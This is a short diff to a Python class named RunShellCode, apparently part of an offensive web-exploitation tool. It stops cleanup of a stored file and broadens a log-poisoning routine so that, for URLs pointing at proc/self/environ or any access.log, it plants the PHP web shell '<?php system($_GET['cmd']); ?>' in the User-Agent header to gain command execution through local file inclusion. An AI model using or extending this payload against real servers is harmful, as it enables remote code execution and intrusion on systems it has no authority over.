@@ -41,8 +41,8 @@ class RunShellCode:
                         self.Cookie = Cookie.read()   
                 if "self.url ="  in line:
                    self.url = line.replace("self.url =",'').replace("\n",'').strip()           
-            if os.path.exists('./Package/shell/.FileWebInfo.txt'):
-                os.remove('./Package/shell/.FileWebInfo.txt')  
+          #  if os.path.exists('./Package/shell/.FileWebInfo.txt'):
+           #     os.remove('./Package/shell/.FileWebInfo.txt')  
             else:
                 pass
         try :            
@@ -95,7 +95,7 @@ class RunShellCode:
                 if os.path.exists ("./Package/shell/.data")  :
                    os.remove("./Package/shell/.data")  
         elif "proc/self/environ" in self.url \
-        or "/var/log/apache2/access.log" in self.url :
+        or "/var/log/apache2/access.log"  in self.url or "access.log" in self.url:
             request = mechanize.Browser()
             paylaodPHP = "<?php system($_GET['cmd']); ?>"  
             request.addheaders = [('User-agent', 'Mozilla/5.0'+paylaodPHP+'(X11; U; Linux i686; en-US; rv:1.9.0.1))\
